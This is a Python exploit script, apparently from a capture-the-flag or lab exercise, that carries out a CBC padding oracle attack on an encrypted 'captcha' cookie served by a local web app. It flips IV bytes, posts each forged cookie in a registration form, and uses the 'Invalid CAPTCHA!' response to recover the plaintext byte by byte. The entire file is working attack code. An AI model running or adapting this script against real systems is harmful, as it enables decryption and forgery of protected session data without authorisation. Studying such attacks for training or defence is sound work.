import base64
import requests
import time

# Configuration
base_url = "http://127.0.0.1:32834"
cookie_name = "captcha"
target_cookie = "2mArom13+gd4q/dQTQu4aFVpwOkejaqPtWuV0Kyn2ls="

# Decode the base64 cookie
cookie_bytes = base64.b64decode(target_cookie)
BLOCK_SIZE = 16
blocks = [cookie_bytes[i:i+BLOCK_SIZE] for i in range(0, len(cookie_bytes), BLOCK_SIZE)]

print(f"[+] Starting padding oracle attack - Refactored")
print(f"[+] Cookie has {len(blocks)} blocks")

def make_request(modified_cookie):
    """Make a request with modified cookie and return response text"""
    try:
        session = requests.Session()
        session.cookies.set(cookie_name, modified_cookie)
        
        # Submit registration form with dummy data
        data = {
            'username': 'testuser',
            'captcha': 'test',
            'submit': 'Submit'
        }
        
        resp = session.post(base_url, data=data, timeout=5)
        return resp.text, resp.status_code
    except Exception as e:
        return f"Error: {e}", -1

def analyze_response_pattern():
    """Analyze the response patterns for valid vs invalid padding"""
    print("\n[*] Analyzing response patterns...")
    
    # Test 1: Completely invalid cookie (random bytes)
    invalid_cookie = base64.b64encode(b'A' * 32).decode()
    resp1, status1 = make_request(invalid_cookie)
    print(f"  Invalid cookie response: '{resp1}' (status: {status1})")
    
    # Test 2: Valid cookie format but modified
    test_bytes = bytearray(cookie_bytes)
    test_bytes[0] ^= 0xFF  # Flip first byte
    modified_cookie = base64.b64encode(test_bytes).decode()
    resp2, status2 = make_request(modified_cookie)
    print(f"  Modified cookie response: '{resp2}' (status: {status2})")
    
    # Test 3: Valid original cookie
    resp3, status3 = make_request(target_cookie)
    print(f"  Valid cookie response: '{resp3}' (status: {status3})")
    
    return resp1, resp2, resp3

# Analyze patterns first
invalid_resp, modified_resp, valid_resp = analyze_response_pattern()

def padding_oracle_attack(iv, ciphertext):
    """Perform padding oracle attack on a single block"""
    decrypted = bytearray(BLOCK_SIZE)
    attempts = 0
    
    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        print(f"\n[+] Decrypting byte position {byte_pos}")
        
        prefix = bytearray(iv)
        
        # Set padding for bytes we already know
        for i in range(byte_pos + 1, BLOCK_SIZE):
            prefix[i] = iv[i] ^ decrypted[i] ^ (BLOCK_SIZE - byte_pos)
        
        # Test all possible values
        valid_responses = []
        for guess in range(256):
            attempts += 1
            
            if attempts % 50 == 0:
                time.sleep(0.1)  # Small delay to avoid overwhelming the server
            
            # Create modified prefix
            test_prefix = bytearray(prefix)
            test_prefix[byte_pos] = iv[byte_pos] ^ guess ^ (BLOCK_SIZE - byte_pos)
            
            # Create full cookie
            full_cookie = test_prefix + ciphertext
            encoded_cookie = base64.b64encode(full_cookie).decode()
            
            # Make request
            response, status = make_request(encoded_cookie)
            
            # Check if this is NOT a padding error
            # Based on pattern analysis, "Invalid CAPTCHA!" means valid padding
            if "Invalid CAPTCHA!" in response:
                valid_responses.append(guess)
                if len(valid_responses) == 1:  # First valid guess
                    print(f"  [+] Candidate byte {byte_pos}: {hex(guess)} ('{chr(guess) if 32 <= guess <= 126 else '.'}')")
            elif "Error" not in response and len(response) < 100 and response != invalid_resp:
                valid_responses.append(guess)
                print(f"  [+] Alternative response for byte {byte_pos}: {hex(guess)}")
        
        if valid_responses:
            # Usually there might be multiple valid padding values due to padding oracle behavior
            # We'll take the most common scenario or the first one
            decrypted[byte_pos] = valid_responses[0]
            print(f"  [+] Selected byte {byte_pos}: {hex(valid_responses[0])}")
            if len(valid_responses) > 1:
                print(f"  [+] Note: {len(valid_responses)} valid values found")
        else:
            print(f"  [-] No valid padding found for byte {byte_pos}")
            decrypted[byte_pos] = 0
    
    return bytes(decrypted)

# Perform the attack
iv = blocks[0]
ciphertext = blocks[1]

print(f"\n[*] IV: {iv.hex()}")
print(f"[*] Ciphertext: {ciphertext.hex()}")

decrypted_block = padding_oracle_attack(iv, ciphertext)
print(f"\n[+] Final decrypted block: {decrypted_block.hex()}")

# Analyze the result thoroughly
print(f"\n[+] Byte analysis:")
for i, byte in enumerate(decrypted_block):
    char = chr(byte) if 32 <= byte <= 126 else '.'
    print(f"  [{i:2d}] 0x{byte:02x} = {byte:3d} = '{char}'")

# Remove PKCS#7 padding
padding_byte = decrypted_block[-1]
if 1 <= padding_byte <= 16:
    padded_data = decrypted_block[:-padding_byte]
    print(f"\n[+] After removing {padding_byte} bytes of padding:")
    print(f"  Hex: {padded_data.hex()}")
    try:
        text = padded_data.decode('utf-8')
        print(f"  Text: '{text}'")
    except:
        try:
            text = padded_data.decode('ascii', errors='replace')
            print(f"  Text (ascii): '{text}'")
        except:
            print(f"  Raw bytes: {padded_data}")
else:
    print(f"\n[-] Invalid padding byte: {padding_byte}")
    # Try to decode anyway
    try:
        text = decrypted_block.decode('utf-8', errors='replace')
        print(f"[+] Text (with errors replaced): '{text}'")
    except:
        print(f"[+] Raw bytes: {decrypted_block}")
